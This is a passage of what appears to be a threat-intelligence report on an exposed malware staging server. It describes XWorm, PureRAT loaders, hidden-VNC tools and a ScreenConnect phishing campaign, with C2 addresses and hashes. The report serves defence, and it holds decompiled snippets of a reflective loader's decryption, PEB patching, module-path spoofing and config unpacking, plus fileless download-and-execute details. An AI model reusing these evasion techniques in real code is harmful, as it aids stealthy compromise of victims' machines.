---
title: "ZeroTrace — Open Directory Exposure at 74.0.42.25"
date: '2026-03-17'
layout: post
permalink: /reports/zerotrace-74-0-42-25-20260316/
category: "MaaS Operation"
hide: true
---

A Comprehensive, Evidence-Based Guide for Security Decision-Makers

**Campaign Identifier:** ZeroTrace-MultiFamily-MaaS-74.0.42.25
**Last Updated:** March 17, 2026

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Key Takeaways](#2-key-takeaways)
3. [Business Risk Assessment](#3-business-risk-assessment)
4. [What Was Found: Malware Classification](#4-what-was-found-malware-classification)
5. [Technical Capabilities Deep-Dive](#5-technical-capabilities-deep-dive)
  - 5a. [XWorm V5.6 RAT](#5a-xworm-v56-rat)
  - 5b. [XwormLoader — 11-Stage Reflective PE Loader](#5b-xwormloader-11-stage-reflective-pe-loader)
  - 5c. [PureRAT v4.1.9 and the Aspdkzb Loader Chain](#5c-purerat-v419-and-the-aspdkzb-loader-chain)
  - 5d. [PureHVNC — Hidden Desktop Control](#5d-purehvnc-hidden-desktop-control)
  - 5e. [Raven RAT — Custom Delphi C2](#5e-raven-rat-custom-delphi-c2)
  - 5f. [ConnectWise ScreenConnect Abuse](#5f-connectwise-screenconnect-abuse)
  - 5g. [CVE-2025-30406 Exploit Kit](#5g-cve-2025-30406-exploit-kit)
  - 5h. [BAK3R Office 365 Credential Cracker](#5h-bak3r-office-365-credential-cracker)
  - 5i. [PowerShell Fileless Droppers](#5i-powershell-fileless-droppers)
  - 5j. [vlc_boxed.exe — DGA-Capable Unknown Family](#5j-vlcboxedexe-dga-capable-unknown-family)
6. [Attack Chain Reconstruction — Kill Chain](#6-attack-chain-reconstruction-kill-chain)
7. [Threat Intelligence Context](#7-threat-intelligence-context)
8. [Threat Actor Assessment — ZeroTrace](#8-threat-actor-assessment-zerotrace)
9. [Credential and Victim Data Inventory](#9-credential-and-victim-data-inventory)
10. [Incident Response Guidance](#10-incident-response-guidance)
11. [Defensive Hardening Recommendations](#11-defensive-hardening-recommendations)
12. [Confidence Levels Summary](#12-confidence-levels-summary)
13. [FAQ](#13-faq)
14. [IOCs](#14-iocs)
15. [Detections](#15-detections)
16. [Appendix A — MITRE ATT&CK Mapping](#16-appendix-a-mitre-attck-mapping)
17. [Appendix B — Research References](#17-appendix-b-research-references)

---

## 1. Executive Summary

During routine threat hunting, an exposed criminal staging server was discovered left open and accessible to anyone on the internet — the operator's complete toolkit available for download without authentication. The server belongs to **ZeroTrace**, a named threat actor corroborated by multiple independent security vendors. The toolkit enables silent takeover of victim computers, mass credential theft using 9.1 million stolen username-password pairs, and ransomware deployment at the operator's discretion. The infrastructure has been running undetected for over 16 months and all services remain active as of the analysis date (2026-03-16).

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/opendir1.png" | relative_url }}" alt="Hunt.io open directory listing at 74.0.42.25 showing 4,750 files totalling 4GB">
  <figcaption><em>Figure 1: Hunt.io view of the open directory at 74.0.42.25 — 4,750 files totalling 4GB hosted on Layer7 Technologies (AS40662). The indexed file tree exposes the operator's complete staging environment: malware toolkit, credential databases, and operator tooling left accessible without authentication.</em></figcaption>
</figure>

### What a Victim Experiences

If a victim runs `Attachment.vbs` from a phishing email — or clicks one of the 500 pre-staged ScreenConnect phishing links — the following happens silently in the background: ScreenConnect installs as a legitimate remote support tool, connecting the victim's machine to the operator's server. The victim sees only a Social Security Administration PDF that opens as a decoy. The operator now has full graphical control of the victim's machine. No malware alarm fires because ScreenConnect is legitimate software.

From that initial foothold, the operator can deploy any combination of the four RAT families present in this toolkit. XWorm captures keystrokes, takes screenshots, steals browser passwords, and can deploy ransomware to encrypt the victim's files on demand. PureRAT operates a separate hidden desktop session — invisible to the victim — where the operator can log into the victim's banking or cryptocurrency accounts. The operator holds 9.1 million username/password pairs to feed into credential stuffing attacks against Office 365, Coinbase, and ISP accounts.

### Risk Assessment


| Risk Factor            | Score (/10)         | Business Impact                                                                                      |
| ---------------------- | ------------------- | ---------------------------------------------------------------------------------------------------- |
| **Overall Risk**       | **8.8 / 10 — HIGH** | Priority response warranted; active infrastructure; ransomware-ready                                 |
| Data Exfiltration      | 9.5                 | Four parallel credential theft channels; 9.1M records already staged; O365 BEC enabled               |
| System Compromise      | 9.5                 | Four simultaneous RAT families; full remote control including hidden desktop sessions                |
| Ransomware Readiness   | 9.0                 | XWorm ransomware module embedded; deployable to any victim on-demand; no additional staging required |
| Persistence Difficulty | 7.5                 | Registry Run keys + ScreenConnect legitimate software; survives standard malware scans               |
| Evasion Capability     | 8.5                 | Fileless loading, sandbox detection, ScreenConnect allow-listed, reflective PE injection             |
| Lateral Movement Risk  | 7.5                 | USB worm spreading; SOCKS proxy; hidden VNC for invisible account takeover                           |


### Toolkit Capabilities

**What This Toolkit Enables:**

- Complete remote control of victim systems through four separate RAT channels (XWorm, PureRAT, PureHVNC, ScreenConnect) running simultaneously
- On-demand ransomware deployment to any currently-compromised victim with no additional preparation
- Hidden browser sessions (HVNC) allowing invisible account takeover — banking, cryptocurrency, email
- Credential stuffing against 9.1 million email/password pairs targeting Office 365, cryptocurrency exchanges, ISP accounts, and education
- Targeted server-side exploitation via CVE-2025-30406 against a specific named ASP.NET application
- Clipboard hijacking to silently redirect cryptocurrency payments (Bitcoin, Ethereum, TRC20)
- USB-based self-propagation across connected removable media

**Why This Threat Is Significant:**

- Infrastructure has been active and undetected for 16+ months — this is not a short-lived campaign
- Novel samples: two core components (`Faidowra.dll`, `Zvafsyattl.exe`) are not in public sandbox databases; the three-stage loader chain uses established fileless .NET loading techniques, but these specific samples and their use as a PureRAT delivery chain are undocumented in reviewed public research
- The operator accidentally exposed their own C2 panel, full RAT source code, and identity-linked metadata — a significant intelligence windfall
- 500 pre-generated ScreenConnect phishing session links are staged and ready for distribution
- **Multi-domain capability:** The actor operates simultaneously across credential theft (9.1M+ stolen credentials), remote access trojan deployment (XWorm, PureRAT, PureHVNC, Raven RAT, ScreenConnect abuse), and on-demand ransomware — a combination that historically required separate specialist skills or team coordination.
- **Lowered barrier to cross-domain capability:** This multi-vector profile — spanning initial access brokering, persistence, and destructive payload delivery — is consistent with AI-assisted tooling or MaaS platform abuse enabling rapid capability acquisition. Defenders should not assume specialization: credential harvesting tools should be treated as a potential ransomware precursor from the same operator.

### Infrastructure Overview

The infrastructure is divided into two clusters:

**Cluster 1 — C2 Server (`185.49.126.140`, AS834/IPXO, Netherlands):**
All malware C2 traffic converges on this single VPS. Four separate malware services run simultaneously on seven ports. The domain `adminxyzhosting[.]com` has a PTR record directly pointing to this IP, linking the ScreenConnect relay domain to the C2 server. PureRAT TLS certificate (`CN=Ayzyqztcoa`) dates to November 2024, establishing the server has been operational for at least 16 months. Domain registration records independently corroborate this: `adminxyzhosting[.]com` was registered on 2024-10-23 and ScreenConnect was deployed to the server within 25 days — neither was flagged nor taken down prior to this analysis. MODERATE confidence: suspected abuse-tolerant hosting (IP leasing model with documented slow abuse response; C2 active 16+ months without action).

**Cluster 2 — Staging/Open Directory (`74.0.42.x`, AS40662/Layer7, Germany):**
Three IPs in the same /24 network block, all under the same customer account (HIGH confidence — ROA-validated BGP announcement, three-source agreement). The open directory at `74.0.42.25` hosts the complete malware toolkit, credential databases, and operator tooling. `chainconnects[.]net` currently resolves to `74.0.42.162` in the same block.

Both clusters geolocate to the Aachen–Kerkrade corridor on the German–Dutch border, less than 5km apart.

### Threat Actor — ZeroTrace

ZeroTrace is the named threat actor behind this operation, recovered from malware artifacts and independently corroborated by Tier 2 threat intelligence vendors.

### Immediate Actions

**For Executive Leadership:**

- The confirmed C2 server (`185.49.126.140`) and staging server (`74.0.42.25`) should be blocked at network perimeters immediately — any connection to these IPs represents confirmed malicious traffic
- The ransomware module embedded in XWorm represents a business continuity risk: affected systems can be encrypted at any time the operator chooses
- The 9.1 million credential database includes corporate Office 365 accounts; BEC (business email compromise) risk is elevated for any organization using O365
- The exploit kit targeting CVE-2025-30406 is victim-specific — if your organization operates Gladinet CentreStack or any legacy ASP.NET application accessible from the internet, assess exposure

**For Technical Teams:**

- Block `185.49.126.140` on all ports; block `74.0.42.25`, `74.0.42.162`, `74.0.42.44`, and `185.49.126.97` at the perimeter
- Hunt for ScreenConnect sessions relaying through `adminxyzhosting[.]com:8041`
- Deploy detection rules from the [detection file]({{ "/hunting-detections/opendirectory-74-0-42-25-20260316-detections/" | relative_url }})
- Review IOC feed: [ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json]({{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }})
- XWorm mutex `5tK099W0Z6AMZVxQ` and PureRAT TCP preamble `\x04\x00\x00\x00` are highly reliable detection anchors

**Primary Threat Vector:** Email phishing via `Attachment.vbs` (VBScript dropper) delivering ScreenConnect MSI; bulk session link distribution; CVE-2025-30406 server-side exploitation. DEFINITE confidence for phishing and exploitation vectors based on scripts and exploit kit recovered from the open directory.

---

## 2. Key Takeaways

**1. Four Remote Access Tools on one server: a double-edged sword**  
The consolidation of XWorm, PureRAT, PureHVNC, and ScreenConnect C2 on a single IP (`185.49.126.140`) is an operational security failure by the operator — but it also means that blocking one IP simultaneously disrupts all four malware families. This is the highest-priority blocking action available to defenders.

**2. On-demand ransomware is present — and this is not typical XWorm behavior**
Most commodity XWorm V5.6 deployments are RAT-only; the automated ransomware plugin is a premium-tier add-on not reliably present in cracked builds. Its presence here signals the actor obtained the full-capability builder, not a stripped baseline. The module is ready to push to any active victim with a single operator command — no additional staging required. Any confirmed XWorm infection on this C2 should be treated as a ransomware incident risk, not just a RAT infection.

**3. The specific samples delivering PureRAT are undocumented**  
Two core PureRAT samples (`Faidowra.dll` and `Zvafsyattl.exe`) are absent from public sandbox databases, and the specific `Aspdkzb → Zvafsyattl → Faidowra` chain has not been documented in reviewed public research. The underlying technique — multi-stage ConfuserEx-obfuscated .NET loaders chaining via `Assembly.Load()` — is well established. What is novel is this particular sample set: these files had no prior public documentation. Hash-based detection will not catch them until the IOCs in this report are added to threat intelligence feeds.

**4. The OPSEC failure created an intelligence windfall — but the operation remains active**
The operator's accidental exposure of their C2 panel, full source code, 9.1 million credentials, and identity-linked metadata is a significant analytical opportunity. However, the operator appears unaware of this exposure as of the analysis date — the infrastructure remains active, and 500 pre-generated phishing links have not yet been distributed. The window for defensive action before those links are used is time-limited.

**5. The operator is intermediate-level, but the toolkit capability is professional-grade**
The OPSEC failures (open directory, exposed C2 panel, debug logs in droppers) indicate an intermediate actor. However, the capabilities assembled through MaaS procurement (PureRAT subscription, XWorm cracked builder, ScreenConnect abuse) exceed what the operator could develop independently. The gap between the operator's skill level and the toolkit's capability is itself a threat intelligence signal: MaaS platforms enable actors of lower technical sophistication to deploy threats of higher capability.

---

## 3. Business Risk Assessment 


| Impact Scenario                                  | Likelihood | Explanation                                                                                                                                                                                                                                                                                          |
| ------------------------------------------------ | ---------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Ransomware deployment**                        | HIGH       | XWorm's ENC/DEC ransomware plugin is embedded in the builder and deployable to any active victim without additional staging. Ransom demands are operator-configurable and applied on a per-victim basis. No prior warning or additional infection step required.                                     |
| **Business Email Compromise (BEC)**              | HIGH       | BAK3R credential cracker targets smtp.office365.com with 25 concurrent threads. The operator already has 9.1M credential pairs including a corporate-format 2M-entry list. Successful O365 account access enables wire transfer fraud, payroll diversion, and further phishing from trusted domains. |
| **Invisible account takeover (banking/crypto)**  | HIGH       | PureHVNC and Raven RAT's HVNC operate hidden desktop sessions — the victim has no indication the operator is logged into their browser. Banking and cryptocurrency sessions can be initiated, transfers made, and the session closed with no visible trace to the victim.                            |
| **Cryptocurrency theft via clipboard hijacking** | HIGH       | XWorm's Clipper silently replaces BTC, ETH, and TRC20 wallet addresses when the victim copies them. Any cryptocurrency transaction the victim believes they are sending to a legitimate address is redirected to the operator's wallet.                                                              |
| **Web server compromise via CVE-2025-30406**     | MEDIUM     | The exploit kit targets a specific named ASP.NET application where the operator already obtained the web.config. Organizations running Gladinet CentreStack (pre-patch) or any legacy ASP.NET application with exposed machineKey values face RCE risk.                                              |
| **Lateral movement via USB propagation**         | MEDIUM     | XWorm copies itself as USB.exe to removable drives. In environments where USB drives are shared across workstations (manufacturing, healthcare, field operations), this enables infection spread without network access.                                                                             |
| **Data exfiltration and credential resale**      | HIGH       | The operator's possession of 5.85M likely-valid credential pairs, sourced from a named Telegram data broker, indicates an established pipeline for credential monetization. Credentials harvested from new victims feed the same pipeline.                                                           |


### Operational Impact — If Infection Is Confirmed

**Immediate (T+0 to T+24 hours):** Isolation of potentially affected systems, perimeter blocking of confirmed C2 IPs, credential rotation for all accounts accessible from affected systems, ScreenConnect session audit.

**Investigation (T+24 to T+72 hours):** Threat hunt across the environment for all IOCs in this report, network log analysis for connections to `185.49.126.140` and `74.0.42.x`, ScreenConnect installation audit on all endpoints.

**Scope Assessment (T+3 to T+7 days):** Identify affected systems, data accessed, credentials potentially captured, persistence mechanisms requiring remediation. Determine whether ransomware module was deployed.

**Ongoing:** Monitor for reinfection via alternate vectors (bulk ScreenConnect links still in circulation), watch for BEC indicators, rotate credentials for any accounts exposed to affected systems.

---

## 4. What Was Found: Malware Classification 


| Family                     | Type                              | Samples                            | Confidence                  | C2                               |
| -------------------------- | --------------------------------- | ---------------------------------- | --------------------------- | -------------------------------- |
| **XWorm V5.6**             | RAT + Ransomware module           | 9 (7 stubs + builder + loader)     | DEFINITE                    | 185.49.126.140:5000              |
| **PureRAT v4.1.9**         | MaaS RAT (ProtoBuf/TLS)           | 11 (9 Stage 1 + Stage 2 + Stage 3) | HIGH (88% — 11 signatures)  | 185.49.126.140:56001–56003       |
| **PureHVNC stub**          | Hidden VNC                        | 2 (GUI + victim stub xh.exe)       | DEFINITE                    | 185.49.126.140:8000              |
| **Raven RAT**              | Custom Delphi RAT (~60% complete) | 2 (stub template + operator panel) | DEFINITE                    | Template placeholder (port 8777) |
| **ScreenConnect v23.2.9**  | Legitimate RMM — abused           | 3                                  | DEFINITE                    | adminxyzhosting.com:443/8041     |
| **Aspdkzb loader cluster** | Three-stage fileless loader       | 9 Stage 1 variants                 | HIGH                        | Delivers PureRAT v4.1.9          |
| **vlc_boxed.exe**          | DGA-capable unknown family        | 1                                  | INSUFFICIENT (inner family) | DGA — domains not captured       |


**Total sample inventory:** 34 items (32 binaries + 4 scripts)

**File Identifier — Primary Analysis Samples:**


| Filename          | SHA256 (full)                                                      | Role                                                          |
| ----------------- | ------------------------------------------------------------------ | ------------------------------------------------------------- |
| `XClient.exe`     | `427f818131c9beb7f8a487cb28fe13e2699db844ac3c9e9ae613fd35113fe77f` | XWorm V5.6 stub — full C2 config decrypted                    |
| `Xworm_V5.6.exe`  | `90f58865f265722ab007abb25074b3fc4916e927402552c6be17ef9afac96405` | XWorm builder/server panel (14.8MB)                           |
| `XwormLoader.exe` | `f5f14b9073f86da926a8ed319b3289b893442414d1511e45177f6915fb4e5478` | Native C++ 11-stage reflective PE loader                      |
| `Aspdkzb.exe`     | `978ead9671e59772eeeb73344fc3b0c068c5168de7f67f738269f5b59e681a9a` | Stage 1 — ConfuserEx fileless loader                          |
| `Faidowra.dll`    | `6b526c29a6961c1f03eeb1ec4ca3a0fdc5680e3f90db013dea8b27d8b63cce57` | Stage 3 — PureRAT v4.1.9 (novel; not in public sandboxes)     |
| `vicTest.exe`     | `b34a0bb0c0ba24dae59b748f1e9dc70fc739c5d4300fe96e8ff66cf6166d3dd8` | Raven RAT C2 panel (operator console — accidentally uploaded) |
| `Attachment.vbs`  | `fdca9ee6e64d67795cd48c5740fa54f509b00bff3e2e94d5f7863e21b23da7f6` | Phishing VBScript dropper                                     |
| `vlc_boxed.exe`   | `7a848e3509c5945f1104c0baa89032ac6e329a84844ca6bf4177b9308d98b2d3` | DGA-capable unknown family (Enigma VB)                        |


Full SHA256 hashes for all 34 samples are available in the [IOC feed]({{ "/ioc-feeds/opendirectory-74-0-42-25-20260316-iocs.json" | relative_url }}).

**Sophistication assessment:** Intermediate. The operator assembles commodity and MaaS tools (XWorm cracked builder, PureRAT subscription), augments them with a novel three-stage fileless loader chain (Aspdkzb cluster — not publicly documented), and has developed a custom Delphi RAT (Raven RAT, approximately 60% complete). The significant OPSEC failure — exposing the entire toolkit, source code, C2 panel, and credential database on an open directory — is inconsistent with a sophisticated organized group.

---

## 5. Technical Capabilities Deep-Dive

> **Plain language:** This is the core technical analysis. Each section explains what a specific malware tool does, how it works, and why it is dangerous. Junior analysts: the "Why this matters" boxes explain the defensive significance of each finding.

> **Executive Impact Summary:**
>
> - **Business Risk:** HIGH — on-demand ransomware, full remote control, credential theft, BEC-ready
> - **Detection Difficulty:** HIGH — fileless loading, legitimate software abuse, sandbox evasion, ScreenConnect allow-listed by default
> - **Remediation Complexity:** MODERATE — Registry Run persistence (user-space); ScreenConnect may be allow-listed; no firmware-level persistence identified
> - **Key Takeaway:** The consolidation of four RAT C2 services on a single server is both an operational security failure by the threat actor and a defender's advantage — blocking one IP disrupts all four malware families simultaneously.


| Capability                                                                                             | Impact   | Detection Difficulty | Confidence                                |
| ------------------------------------------------------------------------------------------------------ | -------- | -------------------- | ----------------------------------------- |
| Full remote access (4 RATs)                                                                            | CRITICAL | HIGH                 | DEFINITE                                  |
| On-demand ransomware (XWorm ENC/DEC)                                                                   | CRITICAL | HIGH                 | DEFINITE                                  |
| Hidden VNC (4 implementations: PureHVNC, Raven RAT HVNC, XWorm HVNC, ScreenConnect RMM remote desktop) | CRITICAL | HIGH                 | DEFINITE                                  |
| Fileless payload execution (3 chains)                                                                  | HIGH     | HIGH                 | DEFINITE                                  |
| Credential theft (keylogger + browser + wallets)                                                       | CRITICAL | HIGH                 | DEFINITE                                  |
| Clipboard hijacking (crypto addresses)                                                                 | HIGH     | HIGH                 | DEFINITE                                  |
| CVE-2025-30406 server exploitation                                                                     | CRITICAL | MEDIUM               | HIGH                                      |
| HTTP DDoS (20-thread slow-POST)                                                                        | MEDIUM   | MEDIUM               | DEFINITE                                  |
| DNS hijacking (hosts file overwrite)                                                                   | HIGH     | MEDIUM               | DEFINITE                                  |
| USB worm propagation                                                                                   | MEDIUM   | MEDIUM               | DEFINITE                                  |
| DGA-based C2 (vlc_boxed.exe)                                                                           | HIGH     | HIGH                 | HIGH (behavior); INSUFFICIENT (family ID) |


---

### 5a. XWorm V5.6 RAT 

> **Plain language:** XWorm is a commodity hacking tool sold and distributed on underground forums. The operator uses a cracked copy. It gives the attacker complete control of a victim's computer — reading keystrokes, taking screenshots, stealing browser passwords, and encrypting files.

**Confidence:** DEFINITE (static analysis — `XClient.exe` fully decompiled; C2 config decrypted)

**C2 Configuration (AES-256 ECB decryption, key = MD5 of mutex `5tK099W0Z6AMZVxQ`):**


| Field            | Value                                             |
| ---------------- | ------------------------------------------------- |
| C2 Host          | `185.49.126.140`                                  |
| C2 Port          | `5000`                                            |
| AES Session Key  | `<999>` (MD5: `893e4e694d81f732ceede1d259a0055f`) |
| Packet Separator | `<Xwormmm>`                                       |
| Version          | `XWorm V5.6`                                      |
| USB Spread File  | `USB.exe`                                         |
| Mutex            | `5tK099W0Z6AMZVxQ`                                |
| Startup Delay    | 3 seconds                                         |


**Confirmed Capabilities (from full decompilation of `XClient.exe`):**

*Remote Access:*

- Hidden shell execution via `Interaction.Shell(cmd, Hide)`
- URL download and execute via `WebClient.DownloadFile` → `Process.Start`
- Drop and execute from C2: GZip payload → `%TEMP%\[random6][ext]` → `powershell -ExecutionPolicy Bypass`
- **Fileless .NET execution** (`FM` command): `AppDomain.CurrentDomain.Load(bytes)` — zero disk footprint

*Surveillance:*

- Screenshot capture (256×156 JPEG → GZip → Base64 → C2)
- Active window title + victim idle time sent every 10–15 seconds in beacon
- Webcam detection via `avicap32.dll!capGetDriverDescriptionA`
- Process keyword monitoring: fires alert to operator on keyword match in process titles
- Built-in keylogger (offline stub present; runtime-configured)

*Credential Theft:*

- `RunRecovery` plugin method — browser credential and stored data recovery

*Destructive Capabilities:*

- **Ransomware module** (`XWorm.Ransomware.resources` — 103,765 bytes embedded as resource)
  - Delivered via ENC/DEC plugin interface pushed from C2 — operator deploys to any active victim at will
  - Default ransom demand: $300 BTC (operator-configurable)
  - State machine prevents accidental double-encryption (`RS` flag)
- **HTTP slow-POST DDoS** (`StartDDos`): 20 threads, `Content-Length: 5235` with no body, 2.5-second hold per connection, loops for operator-specified duration
- **DNS hijacking** (`Shosts`): overwrites `C:\Windows\System32\drivers\etc\hosts`
- **Clipboard hijacking** (Clipper): replaces BTC, ETH, TRC20 wallet addresses in clipboard

*Lateral Movement:*

- USB.exe propagation via `Spread()` flag — copies to all removable drives

*Operator Configuration (runtime, stored at `HKCU\SOFTWARE\XWorm`):*

- `BotToken`, `Botid` — Telegram victim notification (token not in binary; set at runtime)
- `BTC`, `ETH`, `TRC20` — Clipper replacement wallet addresses (set at runtime)
- Sandbox detection: queries `http://ip-api.com/line/?fields=hosting` — exits if running in a hosting/VM environment

**Why This Matters:** The automated ransomware plugin is not a standard feature of commodity XWorm V5.6 builds — it is a premium-tier add-on absent from many cracked distributions. Its presence here confirms the operator obtained the full-capability builder, placing this actor above the baseline skill threshold of typical XWorm deployments. The module requires no additional staging: it is already embedded and can be pushed from the operator's panel to any active victim with a single click, meaning even a low-value initial infection can become a ransomware incident at any time the operator chooses. The AES key seed (`5tK099W0Z6AMZVxQ`) is the same string as the mutex, meaning the mutex alone in memory is sufficient evidence to identify the key and decrypt intercepted C2 traffic.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/ransomware_capability.png" | relative_url }}" alt="Decompiled XWorm V5.6 ENC plugin handler showing Messages.RS state machine">
  <figcaption><em>Figure 2: Decompiled ENC plugin handler from XWorm V5.6. The operator pushes the 103KB ransomware module to any active victim via a single panel command. The <code>Messages.RS</code> state machine (RS = 1 during encryption, RS = 2 when complete) prevents accidental double-encryption — confirming this is a deliberate, production-ready ransomware implementation embedded in the builder.</em></figcaption>
</figure>

---

### 5b. XwormLoader — 11-Stage Reflective PE Loader 

> **Plain language:** XwormLoader is a custom loading tool that injects XWorm into memory without ever writing it to disk. It also disguises itself to look like a legitimate Windows component. This makes it harder for antivirus tools to detect.

**Confidence:** DEFINITE (static analysis — `XwormLoader.exe` fully reverse-engineered)

**File:** `XwormLoader.exe` | SHA256: `f5f14b9073f86da926a8ed319b3289b893442414d1511e45177f6915fb4e5478` | 501,816 bytes | Native C++ (MSVC 15.00–16.00)

This is an unusual finding in the XWorm ecosystem, which normally relies on pure .NET loading. XwormLoader is a purpose-built native binary implementing reflective PE (Portable Executable) loading — a technique where the loader maps an executable into memory without using the Windows loader, leaving minimal forensic traces.

**Loading sequence (11 stages):**

1. `main()` calls `FreeConsole()` immediately — decoy strings ("random number generator", "This is garbage code #0–9") are permanently invisible even if run in a console
2. 292,352 encrypted bytes located at file offset `0x426218`
3. Decryption: `NOT(byte) - 0x3E` per byte (single-pass arithmetic)
4. PE signature validation after decryption
5. Manual PE header and section mapping into allocated memory
6. Base relocation processing — corrects absolute addresses for load address delta
7. Import table resolution — `LoadLibraryA` + `GetProcAddress` for all dependencies
8. Memory page protection assignment per section (execute/read/write as appropriate)
9. **PEB patching** — replaces `PEB->ImageBaseAddress` with injected PE base, masking the real loader
10. **LDR module path spoofing** — writes fake `C:\Windows\Microsoft.NET\Framework\...` path to the loaded module list entry, making the injected module appear to be a legitimate .NET Framework component
11. Thread launch via `CreateThread` on entry point; for .NET payload: temporarily injects a fake .NET Framework path to assist CLR initialization, restores after 100ms

Zero disk writes at any stage. The embedded payload is confirmed .NET.

**Key stages — decompiler evidence:**

Stage 1 decryption loop (decompiler output, VA `0x00401060`):

```asm
NOT each byte          ; bitwise complement
ADD 0x38               ; add 56
SUB 0x76               ; subtract 118  →  net: NOT(byte) - 0x3E per byte
MUL 0xDF               ; result never stored back — dead code / anti-disassembly artifact
```

Stage 9 PEB patching (VA `0x0040145f`):

```c
PEB = fs:[0x30]                              // get Process Environment Block via TEB
edi_7 = PEB->Ldr->InMemoryOrderModuleList   // LDR module list
PEB->ImageBaseAddress = new_base            // PEB+8: report injected PE as process image
LDR_MODULE->DllBase = new_base              // update module list base address
```

Stage 10 LDR path spoof (VA `0x004014a3`):

```c
LDR_MODULE->FullDllName.Buffer = "C:\\Windows\\Microsoft.NET\\Framework\\..."
LDR_MODULE->FullDllName.Length = lstrlenW(path) * 2
// For .NET payloads: restore original after CLR initialization (100ms delay)
LDR_MODULE->FullDllName = restore_original
```

**Why This Matters:** Standard antivirus detection relies on file scanning and known-hash matching. A reflective loader that never writes the payload to disk defeats both. The PEB patching and LDR path spoofing make forensic tools that enumerate running processes see `C:\Windows\Microsoft.NET\Framework\...` instead of the actual injected code. This technique is consistent with what security researchers describe as process hollowing-adjacent anti-forensics.

**Detection Method:** Sysmon Event ID 8 (CreateRemoteThread) or EDR API telemetry for `VirtualAlloc(PAGE_EXECUTE_READWRITE)` followed by `CreateThread`. The decryption byte pattern `F6 D0 2C 3E` (NOT then SUB 0x3E) is a unique binary signature.

---

### 5c. PureRAT v4.1.9 and the Aspdkzb Loader Chain 

> **Plain language:** PureRAT is a commercial hacking tool sold by subscription on underground forums. The operator delivers it through a three-step invisible loading process — each step unpacks the next entirely in memory, never touching the hard drive. The final payload is a sophisticated RAT that communicates over an encrypted channel.

**Confidence:** HIGH (88% — 11 independent technical signatures matched against published reports from Netresec, Check Point Research, Fortinet, and Derp.ca)

**Novel findings (not in any reviewed public report):**

- C2 IP `185.49.126.140` — not attributed to PureRAT in any reviewed public source
- `Faidowra.dll` (Stage 3) and `Zvafsyattl.exe` (Stage 2) hashes not present in web-accessible sandbox databases at analysis date
- Three-stage loader chain `Aspdkzb → Zvafsyattl → Faidowra` — these specific samples and their use as a PureRAT delivery chain are undocumented in public research; the underlying fileless .NET loading technique is well established

**Three-Stage Fileless Loader Chain:**

```
Stage 1: Aspdkzb.exe (ConfuserEx obfuscated, 312–325KB)
         — AES-256 + GZip decrypt of embedded payload
         — Assembly.Load() reflection → Stage 2 in memory (no disk write)

Stage 2: Zvafsyattl.exe (ConfuserEx, 325KB, entropy 7.97)
         — TEA (Tiny Encryption Algorithm) cipher in inner decryption
         — Assembly.Load() + GetExportedTypes reflection → Stage 3 in memory

Stage 3: Faidowra.dll (PureRAT v4.1.9, .NET Reactor 6.x, 770KB)
         — Full RAT payload; connects to 185.49.126.140:56001/56002/56003
```

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/extremedump.png" | relative_url }}" alt="ExtremeDumper output showing Zvafsyattl.exe and Faidowra.dll loaded in memory inside Aspdkzb-cleaned.exe">
  <figcaption><em>Figure 3: A memory forensics tool (ExtremeDumper) attached to the running <code>Aspdkzb-cleaned.exe</code> (PID 7220) confirms all three stages of the loader chain operating simultaneously in memory — none written to disk at any point. <code>Zvafsyattl.exe</code> is identified at base address <code>0x0000000000000000</code> and <code>Faidowra.dll</code> appears at three separate load addresses (<code>0x572000</code>, <code>0x152FF0</code>, <code>0x42B050</code>). This is direct forensic evidence of the fileless chain: Aspdkzb decrypts and reflectively loads Zvafsyattl, which in turn loads multiple instances of Faidowra.dll entirely in managed memory.</em></figcaption>
</figure>

ConfuserEx is a public .NET obfuscation tool (obfuscator/packer). TEA (Tiny Encryption Algorithm) is a block cipher used in the inner decryption. The `.NET Reactor 6.x` protection on `Faidowra.dll` adds a further layer of commercial obfuscation.

**Config blob — how it is embedded (decompiled C#, `Faidowra_Slayed.dll`):**

```csharp
private static void ConcatFilteredChain()
{
    // Config stored inline as Base64 literal in IL — no external file
    OrderChain.m_ChainSummarizer = (DefinitionChooser)GroupedPredicate.AssessPredicate(
        Convert.FromBase64String("H4sIAAAAAAAEAIWUOc705hGEDSsQIFiCYodKB/i5b85e7vu+Z...")
        // H4sI = GZip magic (1F 8B 08) — blob is Base64(GZip(ProtoBuf))
    );
    // Pinned TLS certificate also extracted from the same config object:
    OrderChain._TesterUser = new X509Certificate2(
        Convert.FromBase64String(OrderChain.m_ChainSummarizer.EncryptSystem));
}
```

The encoding stack: inline Base64 → `Convert.FromBase64String()` → GZip decompress → ProtoBuf deserialize → `DefinitionChooser` config object. The C2 IP, ports, and TLS certificate are all stored in this single blob — no hardcoded strings appear in plaintext IL.

**C2 Configuration (decoded from Base64 → GZip → ProtoBuf config blob):**


| Field                     | Value                                                           |
| ------------------------- | --------------------------------------------------------------- |
| C2 IP                     | `185.49.126.140`                                                |
| C2 Ports                  | `56001`, `56002`, `56003` (tried in sequence on each reconnect) |
| Campaign Tag              | `Default`                                                       |
| TLS Certificate CN        | `Ayzyqztcoa` (auto-generated random 10-char per build)          |
| TLS Certificate Type      | Self-signed, 4096-bit RSA, `NotAfter: 9999-12-31`               |
| TLS Certificate NotBefore | 2024-11-21 19:42:39 UTC                                         |
| Protocol Preamble         | `\x04\x00\x00\x00` (4-byte TCP preamble before TLS handshake)   |
| Protocol Framing          | 4-byte little-endian length prefix on all messages after TLS    |

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/OpenDirectory-74.0.42.25/extractedC2_Ports.png" | relative_url }}" alt="Hex editor showing 185.49.126.140 in config_raw.bin alongside PowerShell ISE decoding ports 56001-56003">
